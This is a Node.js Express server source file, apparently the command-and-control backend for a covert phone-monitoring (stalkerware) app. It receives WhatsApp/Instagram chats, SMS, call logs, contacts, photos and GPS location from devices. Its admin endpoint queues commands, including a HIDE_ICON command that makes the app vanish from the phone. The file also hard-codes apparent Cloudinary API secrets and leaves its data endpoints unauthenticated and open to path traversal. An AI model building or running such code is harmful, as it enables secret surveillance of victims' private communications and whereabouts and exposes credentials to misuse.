const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. CLOUDINARY CONFIG (Tumhari Keys) ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- 2. SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));

// Heavy files ke liye limit badha di hai
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status (RAM Storage - Temporary)
let devicesStatus = {}; 

// --- 3. ROOT ROUTE ---
app.get('/', (req, res) => {
    res.send('✅ Server is Running Successfully (Chat & HD Gallery Ready)!');
});

// ==================================================
//  GALLERY SYSTEM (HD PHOTOS)
// ==================================================

// A. PHOTO UPLOAD
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data } = req.body;

    if (!device_id || !image_data) {
        return res.status(400).json({ error: "No Data Received" });
    }

    const id = device_id.toString().trim().toUpperCase();

    // Base64 check
    let base64Image = image_data;
    if (!base64Image.startsWith('data:image')) {
        base64Image = "data:image/jpeg;base64," + image_data;
    }

    // Cloudinary Upload (HD Settings)
    cloudinary.uploader.upload(base64Image, 
        { 
            folder: id,
            public_id: Date.now().toString(), 
            resource_type: "image",
            width: 1280,            // ✅ HD Quality
            quality: "auto",
            fetch_format: "auto"
        },
        function(error, result) {
            if (error) {
                console.error("❌ Cloudinary Upload Error:", error);
                return res.status(500).json({ error: "Upload Failed" });
            }
            console.log(`📸 [GALLERY] HD Photo Saved for ${id}`);
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

// B. GALLERY LIST (Website ke liye)
app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;

    cloudinary.api.resources({
        type: 'upload',
        prefix: id + "/",      
        max_results: 20,       
        next_cursor: next_cursor, 
        direction: 'desc',     // Nayi photo sabse upar
        context: true
    }, 
    function(error, result) {
        if (error) {
            return res.json({ photos: [], next_cursor: null });
        }
        const photos = result.resources.map(img => img.secure_url);
        res.json({ 
            photos: photos, 
            next_cursor: result.next_cursor 
        });
    });
});

// ==================================================
//  ADMIN DASHBOARD & STATUS (Online/Offline)
// ==================================================

app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    
    if (!device) return res.json({ id: id, isOnline: false });
    
    // Agar 60 second se purana ping hai to offline maano
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// PHONE PING (Heartbeat) - App ye hit karega command lene ke liye
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        // Command Check (Agar admin ne kuch bheja hai)
        let pendingCommand = "none";
        
        // Check karte hain agar koi command (Jaise HIDE_ICON) queue me hai
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            
            // Console me confirm karo ki command deliver ho gayi
            if(pendingCommand === 'HIDE_ICON') {
                console.log(`⚠️ [SERVER] HIDE_ICON Delivered to ${id}. App should vanish now.`);
            }

            devicesStatus[id].command = "none"; // Command bhej diya, ab clear kar do
        }

        // RAM Data Update
        devicesStatus[id] = {
            ...devicesStatus[id], 
            id: id,
            model: model || (devicesStatus[id]?.model || "Unknown"),
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || (devicesStatus[id]?.lat || 0),
            lon: lon || (devicesStatus[id]?.lon || 0),
            lastSeen: Date.now(),
            command: devicesStatus[id]?.command || "none" 
        };

        res.json({ status: "success", command: pendingCommand });

    } catch (e) {
        console.error("Ping Error:", e);
        res.status(500).json({ error: "Server Error" });
    }
});

// ADMIN COMMAND SENDER (Website se yahan aayega)
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    
    const id = device_id.toUpperCase().trim();
    
    // Agar device pehle se memory me nahi hai, to add kar lo
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
    
    // Command set kar do (Phone next ping me utha lega)
    devicesStatus[id].command = command;
    
    if (command === 'HIDE_ICON') {
        console.log(`👁️‍🗨️ [ADMIN] HIDE REQUEST RECEIVED for ${id}`);
    } else {
        console.log(`🚀 [ADMIN] Command '${command}' sent to ${id}`);
    }
    
    res.json({ status: "success", command: command });
});

// ==================================================
//  🔥 DATA STORAGE (MAIN PART)
//  WhatsApp/Insta Chat, SMS, Location
// ==================================================

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // 1. LOCATION (Isme history nahi chahiye, bas latest kaafi hai)
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
            // Purana delete karke naya save karo
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }
        
        // 2. CHAT LOGS, SMS, CONTACTS (Isme History chahiye)
        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            
            // Agar pehle se file hai, to uska data read karo
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            
            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];

            // 🔥 CHAT LOGS SPECIAL: Time add karo agar nahi hai
            if (type === 'chat_logs') {
                newDataArray = newDataArray.map(msg => ({
                    ...msg,
                    timestamp: msg.timestamp || Date.now() // Sorting ke liye time zaroori hai
                }));
            }
            
            // 🔥 MERGE: Purana data + Naya Data (Append)
            let finalData;
            if (type === 'chat_logs') {
                // Chats me naya neeche judega (WhatsApp jaisa)
                finalData = [...existingData, ...newDataArray]; 
                
                // File zyada bhari na ho, isliye last 5000 messages rakhenge
                if (finalData.length > 5000) finalData = finalData.slice(finalData.length - 5000);
            } else {
                // SMS ya Call logs me naya upar rakhna behtar hai
                finalData = [...newDataArray, ...existingData].slice(0, 2000); 
            }

            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
            console.log(`✅ [DATA] ${type} saved for ${id} (Total: ${finalData.length})`);
        } 
        else {
            // Baaki types ke liye direct save
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// Website ko Data dene ke liye API
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
